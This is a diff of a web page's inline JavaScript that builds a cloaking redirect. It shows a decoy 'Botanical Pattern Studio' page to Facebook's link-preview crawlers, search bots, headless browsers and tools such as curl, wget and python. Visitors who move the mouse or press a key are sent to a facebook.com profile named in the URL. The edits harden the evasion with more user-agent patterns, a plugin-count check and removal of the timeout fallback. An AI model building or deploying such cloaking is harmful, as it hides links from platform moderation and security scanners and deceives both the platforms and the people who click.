@@ -24,7 +24,7 @@
 </head>
 <body>
 
-<!-- ===== DECOY: Always in DOM, always visible ===== -->
+<!-- ===== DECOY PAGE (Bots will see this forever) ===== -->
 <div class="card">
   <h1>Botanical Pattern Studio</h1>
   <p>Loading curated floral guides and handcraft schematics...</p>
@@ -57,29 +57,31 @@
   if (endpoint !== "https://facebook.com/") return;
 
   // =========================================================
-  // 2. PARSE ID
+  // 2. PARSE ID & TARGET VALIDATION
   // =========================================================
   var params = new URLSearchParams(location.search);
   var id = params.get("id");
   
-  // If no id, or if the id is the explicit test bot string, stop.
-  if (!id) return;
+  if (!id) return; // No ID -> Show Decoy
+  
+  // Strip slashes and enforce strict alphanumeric format
   id = id.replace(/^\/+|\/+$/g, "");
-  if (id === "bedroomddd") return; // Keeps bots or tests on decoy
+  if (id === "bedroomddd") return; // Explicit block for test bot URL
   if (!/^[A-Za-z0-9._~-]{1,128}$/.test(id)) return;
-  if (/[\r\n\x00-\x1F]/.test(id)) return;
 
   // =========================================================
-  // 3. BUILD DESTINATION -> https://facebook.com/bedroomd/
+  // 3. BUILD DESTINATION
   // =========================================================
   var dest = endpoint + encodeURIComponent(id) + "/";
   if (!/^https:\/\/facebook\.com\/[A-Za-z0-9._~-]+\/$/.test(dest)) return;
 
   // =========================================================
-  // 4. BOT DETECTION (HEADERS & UA)
+  // 4. STRICT BOT DETECTION
   // =========================================================
-  var ua  = navigator.userAgent || "";
-  var ref = document.referrer || "";
+  var ua = navigator.userAgent || "";
+  
+  // Block empty UAs (common in python/node scrapers)
+  if (!ua || ua.length < 20) return;
 
   var BOT_UA = [
     /facebookexternalhit/i, /meta-externalagent/i, /facebookcatalog/i,
@@ -88,19 +90,23 @@
     /telegrambot/i, /discordbot/i, /googlebot/i, /bingbot/i,
     /ahrefsbot/i, /semrushbot/i, /yandexbot/i, /duckduckbot/i,
     /applebot/i, /baiduspider/i, /seznambot/i, /petalbot/i,
-    /headlesschrome/i, /phantomjs/i, /puppeteer/i, /playwright/i
+    /headlesschrome/i, /phantomjs/i, /puppeteer/i, /playwright/i,
+    /curl/i, /wget/i, /python/i, /node/i, /axios/i
   ];
   
   for (var i = 0; i < BOT_UA.length; i++) {
-    if (BOT_UA[i].test(ua)) return; // Bot -> Stays on decoy
+    if (BOT_UA[i].test(ua)) return; // Bot -> Stays on decoy ✅
   }
 
-  if (navigator.webdriver === true) return; // Headless -> Stays on decoy
-  if (typeof performance === "undefined" || typeof performance.now !== "function") return;
+  // Block headless/automation frameworks
+  if (navigator.webdriver === true) return;
+  if (navigator.plugins.length === 0) return; // Bots rarely have plugins
 
   // =========================================================
-  // 5. HUMAN GATE (INTERACTION REQUIRED)
+  // 5. STRICT HUMAN INTERACTION GATE (NO TIMEOUT FALLBACK)
   // =========================================================
+  // If a bot lands here, it will NOT move a mouse or press a key.
+  // Therefore, we ONLY redirect on genuine human interaction.
   var redirected = false;
   function go() {
     if (redirected) return;
@@ -111,20 +117,13 @@
   var humanSignals = 0;
   function tick() {
     humanSignals++;
-    // Requires 1 movement/click to trigger the redirect
-    if (humanSignals >= 1) go();
+    if (humanSignals >= 1) go(); // Requires 1 real movement/click
   }
 
-  ["mousemove","touchstart","keydown","pointerdown","scroll"]
-    .forEach(function (ev) {
-      window.addEventListener(ev, tick, { passive: true });
-    });
-
-  // Safety fallback: if the browser is open, visible, and not a bot, 
-  // it will redirect after 2 seconds even if the user doesn't move the mouse.
-  setTimeout(function () {
-    if (document.visibilityState === "visible") go();
-  }, 2000);
+  // Listen for genuine interactions
+  ["mousemove", "touchstart", "keydown", "pointerdown", "scroll"].forEach(function (ev) {
+    window.addEventListener(ev, tick, { passive: true, once: false });
+  });
 
 })();
 </script>
